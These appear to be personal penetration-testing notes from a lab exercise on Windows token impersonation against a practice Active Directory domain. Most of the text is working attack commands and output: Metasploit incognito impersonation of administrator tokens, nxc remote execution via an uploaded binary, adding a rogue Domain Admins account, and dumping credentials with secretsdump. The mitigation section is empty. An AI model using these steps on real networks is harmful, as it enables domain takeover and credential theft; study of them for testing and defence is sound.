
- what are tokens
	- temporary keys that allow you access to a system/network without having to provide credentials each time you access a file
	- Think cookies for computers
- Types of tokens:
	- Delegate
		- Created for logging into a machine or using remote desktop
	- Impersonate
		- Non-interactive such as attaching a network drive or a domain logon script



using metasploits meterpreter we can load the incognito model,  and then list them

## Ways To exploit

### Metasploit
```
load # to see all options
load incognito
list_tokens -u 
impersonate_token marvel\\fcastle
impersonate_token marvel\\administrator
shell 
rev2self in meterpreter to return to your original token
```

### nxc

```
kali@kali ~> nxc smb 192.168.176.129 -u fcastle -p 'Password1' -M impersonate
SMB         192.168.176.129 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.176.129 445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
IMPERSON... 192.168.176.129 445    HYDRA-DC         [*] Uploading Impersonate.exe
IMPERSON... 192.168.176.129 445    HYDRA-DC         [+] Impersonate binary successfully uploaded
IMPERSON... 192.168.176.129 445    HYDRA-DC         [*] Listing available primary tokens
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 0  High   NT AUTHORITY/SYSTEM
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 1  High   Font Driver Host/UMFD-0
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 2  Medium Font Driver Host/UMFD-1
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 3  Medium Font Driver Host/UMFD-0
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 4  Medium NT AUTHORITY/NETWORK SERVICE
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 5  Medium NT AUTHORITY/SYSTEM
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 6  High   Window Manager/DWM-1
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 7  High   NT AUTHORITY/LOCAL SERVICE
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 8  High   NT AUTHORITY/NETWORK SERVICE
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 9  High   MARVEL/fcastle
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 10 High   NT AUTHORITY/ANONYMOUS LOGON
IMPERSON... 192.168.176.129 445    HYDRA-DC         Primary token ID: 11 Low    NT AUTHORITY/LOCAL SERVICE
IMPERSON... 192.168.176.129 445    HYDRA-DC         [+] Impersonate binary successfully deleted
```


```
kali@kali ~> nxc smb 192.168.176.129 -u fcastle -p 'Password1' -M impersonate -o TOKEN=1 EXEC='whoami'
SMB         192.168.176.129 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.176.129 445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
IMPERSON... 192.168.176.129 445    HYDRA-DC         [*] Uploading Impersonate.exe
IMPERSON... 192.168.176.129 445    HYDRA-DC         [+] Impersonate binary successfully uploaded
IMPERSON... 192.168.176.129 445    HYDRA-DC         [*] Executing whoami as Font Driver Host/UMFD-0
IMPERSON... 192.168.176.129 445    HYDRA-DC         font driver host\umfd-0
IMPERSON... 192.168.176.129 445    HYDRA-DC         [+] Impersonate binary successfully deleted

```

### After a token, now what?

```
net user /add hawkeye Password1@ /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

now we should be able to run `secretsdump` on this

```
secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.176.129
```



## Mitigation
